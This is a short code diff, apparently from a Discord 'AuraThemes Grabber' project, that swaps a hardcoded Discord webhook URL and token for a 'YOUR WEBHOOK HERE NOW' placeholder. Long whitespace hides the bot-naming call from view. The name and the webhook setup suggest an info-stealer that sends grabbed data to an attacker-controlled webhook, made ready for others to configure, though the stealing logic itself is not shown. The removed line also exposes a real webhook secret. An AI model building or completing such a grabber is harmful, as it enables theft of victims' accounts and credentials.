@@ -8,7 +8,7 @@ const app = require('express')(),
     server = http.createServer(app),
     FormData = require('form-data');
 let { Webhook, MessageBuilder } = require("discord-webhook-node"),
-    webhook = new Webhook("https://discord.com/api/webhooks/1171827929479643137/L_d7fyoRBMJYsO20ujlsyNTP05CZKogc18k-BaKqisbJ05aK9oJetCip7DeGSnZW9IzD")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")
+    webhook = new Webhook("YOUR WEBHOOK HERE NOW")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")
 
 String.prototype.hi = (i, s) => {
   if (i < 0) i = 0; if (i > this.length) i = this.length;
